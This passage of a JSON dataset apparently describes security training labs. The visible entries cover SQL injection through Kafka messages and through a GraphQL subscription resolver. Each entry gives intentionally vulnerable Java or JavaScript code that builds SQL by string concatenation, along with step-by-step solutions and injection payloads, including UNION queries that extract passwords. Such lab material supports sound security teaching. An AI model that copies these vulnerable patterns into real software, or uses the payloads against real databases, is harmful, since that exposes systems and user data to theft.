    "Solution Steps": [
      "Produce Kafka message with malicious payload: {\"id\":\"1' OR 1=1--\"}",
      "Observe connector logs for SQL errors",
      "Craft messages to extract data via UNION",
      "Bypass consumer filtering",
      "Compromise the target database"
    ],
    "Vulnerability name": "Kafka-to-SQL Injection",
    "srcCode": "@KafkaListener(topics = \"orders\")\npublic void listen(Order order) {\n  jdbcTemplate.execute(\n    \"INSERT INTO orders VALUES('\" + order.getId() + \"')\"\n  );\n}",
    "payloads": [
      "{\"id\":\"1' OR 1=1--\"}",
      "{\"id\":\"1'; SELECT * FROM users--\"}"
    ]
  },
  {
    "Lab scenario": "SQL Injection in GraphQL Subscription Resolver",
    "Lab Description": "A GraphQL subscription resolver dynamically builds SQL queries for real-time updates using unsanitized subscription arguments. The resolver fails to properly escape arguments before embedding them in LIKE clauses for change detection.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Subscribe to GraphQL subscription with malicious argument",
      "Payload: subscription { alerts(filter: \"test' OR 1=1--\") }",
      "Observe unexpected real-time events",
      "Extract data through timing attacks",
      "Compromise the real-time notification system"
    ],
    "Vulnerability name": "GraphQL Subscription Injection",
    "srcCode": "const resolvers = {\n  Subscription: {\n    alerts: {\n      subscribe: (_, { filter }) => {\n        return db.query(`SELECT * FROM alerts WHERE message LIKE '%${filter}%'`);\n      }\n    }\n  }\n};",
    "payloads": [
      "test' OR 1=1--",
      "' UNION SELECT password FROM users--"
    ]
  }
]